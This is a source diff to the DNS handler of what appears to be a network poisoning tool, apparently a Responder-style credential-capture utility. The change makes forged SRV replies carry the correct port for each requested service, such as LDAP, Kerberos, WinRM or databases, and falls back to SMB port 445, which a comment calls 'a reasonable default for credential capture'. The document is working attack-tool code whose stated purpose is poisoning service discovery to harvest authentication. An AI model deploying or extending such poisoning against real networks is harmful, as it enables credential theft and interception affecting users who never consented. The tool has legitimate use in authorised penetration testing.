@@ -421,15 +421,17 @@ class DNS(BaseRequestHandler):
 			
 			elif query_type == 33:  # SRV record (service discovery)
 				# SRV format: priority, weight, port, target
-				# Useful for capturing Kerberos, LDAP, etc.
-				srv_data = struct.pack('>HHH', 0, 0, 445)  # priority, weight, port (SMB)
+				# Determine correct port based on service name in query
+				srv_port = self.get_srv_port(query_name)
+				
+				srv_data = struct.pack('>HHH', 0, 0, srv_port)  # priority, weight, port
 				srv_data += b'\xc0\x0c'  # Target (pointer to query name)
 				
 				response += struct.pack('>H', len(srv_data))
 				response += srv_data
 				
 				if settings.Config.Verbose:
-					print(color('[DNS] SRV record poisoned - potential service auth capture', 3, 1))
+					print(color('[DNS] SRV record poisoned: %s -> port %d' % (query_name, srv_port), 3, 1))
 			
 			elif query_type == 255:  # ANY query
 				# Respond with A record
@@ -655,6 +657,101 @@ class DNS(BaseRequestHandler):
 			255: 'ANY'
 		}
 		return types.get(query_type, 'TYPE%d' % query_type)
+	
+	def get_srv_port(self, query_name):
+		"""
+		Determine the correct port for SRV record responses based on service name.
+		
+		SRV query format: _service._protocol.name
+		Examples:
+		  _ldap._tcp.dc._msdcs.domain.local → 389
+		  _kerberos._tcp.domain.local → 88
+		  _gc._tcp.domain.local → 3268
+		
+		Returns appropriate port for the service, defaults to 445 (SMB) if unknown.
+		"""
+		query_lower = query_name.lower()
+		
+		# Service to port mapping
+		# Format: (service_pattern, port)
+		srv_ports = [
+			# LDAP services
+			('_ldap._tcp', 389),
+			('_ldap._udp', 389),
+			('_ldaps._tcp', 636),
+			
+			# Kerberos services
+			('_kerberos._tcp', 88),
+			('_kerberos._udp', 88),
+			('_kerberos-master._tcp', 88),
+			('_kerberos-master._udp', 88),
+			('_kpasswd._tcp', 464),
+			('_kpasswd._udp', 464),
+			('_kerberos-adm._tcp', 749),
+			
+			# Global Catalog (Active Directory)
+			('_gc._tcp', 3268),
+			('_gc._ssl._tcp', 3269),
+			
+			# Web services
+			('_http._tcp', 80),
+			('_https._tcp', 443),
+			('_http._ssl._tcp', 443),
+			
+			# Email services
+			('_smtp._tcp', 25),
+			('_submission._tcp', 587),
+			('_imap._tcp', 143),
+			('_imaps._tcp', 993),
+			('_pop3._tcp', 110),
+			('_pop3s._tcp', 995),
+			
+			# File/Remote services
+			('_smb._tcp', 445),
+			('_cifs._tcp', 445),
+			('_ftp._tcp', 21),
+			('_sftp._tcp', 22),
+			('_ssh._tcp', 22),
+			('_telnet._tcp', 23),
+			('_rdp._tcp', 3389),
+			('_ms-wbt-server._tcp', 3389),  # RDP
+			
+			# Windows services
+			('_winrm._tcp', 5985),
+			('_winrm-ssl._tcp', 5986),
+			('_wsman._tcp', 5985),
+			('_ntp._udp', 123),
+			
+			# Database services
+			('_mssql._tcp', 1433),
+			('_mysql._tcp', 3306),
+			('_postgresql._tcp', 5432),
+			('_oracle._tcp', 1521),
+			
+			# SIP/VoIP
+			('_sip._tcp', 5060),
+			('_sip._udp', 5060),
+			('_sips._tcp', 5061),
+			
+			# XMPP/Jabber
+			('_xmpp-client._tcp', 5222),
+			('_xmpp-server._tcp', 5269),
+			
+			# Other
+			('_finger._tcp', 79),
+			('_ipp._tcp', 631),  # Internet Printing Protocol
+		]
+		
+		# Check each pattern
+		for pattern, port in srv_ports:
+			if query_lower.startswith(pattern):
+				return port
+		
+		# Default to SMB port for unknown services
+		# This is a reasonable default for credential capture
+		if settings.Config.Verbose:
+			print(text('[DNS] Unknown SRV service in %s, using default port 445' % query_name))
+		return 445
 
 
 class DNSTCP(BaseRequestHandler):
